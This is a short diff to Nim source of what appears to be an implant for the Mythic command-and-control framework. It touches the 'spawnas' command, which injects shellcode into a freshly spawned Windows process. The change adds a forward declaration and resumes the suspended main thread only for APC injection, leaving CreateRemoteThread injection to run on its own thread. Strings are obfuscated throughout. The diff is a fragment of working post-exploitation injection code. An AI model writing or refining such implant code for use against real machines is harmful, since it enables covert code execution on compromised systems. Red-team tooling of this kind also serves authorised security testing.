@@ -40,6 +40,8 @@ proc spawnas*(taskId: string, params: JsonNode): JsonNode =
   else:
     return mythicError(taskId, obf("spawnas command is only available on Windows"))
 
+proc executeSpawnAs*(taskId: string, shellcode: seq[byte], params: JsonNode): JsonNode
+
 proc processSpawnAsChunk*(taskId: string, params: JsonNode, chunkData: string,
                           totalChunks: int, currentChunk: int,
                           fileData: var seq[byte]): JsonNode =
@@ -183,8 +185,10 @@ proc executeSpawnAs*(taskId: string, shellcode: seq[byte], params: JsonNode): Js
         CloseHandle(pi.hThread)
         return mythicError(taskId, obf("Unknown injection technique: ") & args.technique)
       
-      # Resume the main thread
-      discard ResumeThread(pi.hThread)
+      # Only resume the main thread for APC injection (APC fires on resume).
+      # For CreateRemoteThread, the shellcode runs on its own thread.
+      if args.technique.toLower() == obf("apc"):
+        discard ResumeThread(pi.hThread)
       CloseHandle(pi.hProcess)
       CloseHandle(pi.hThread)
       
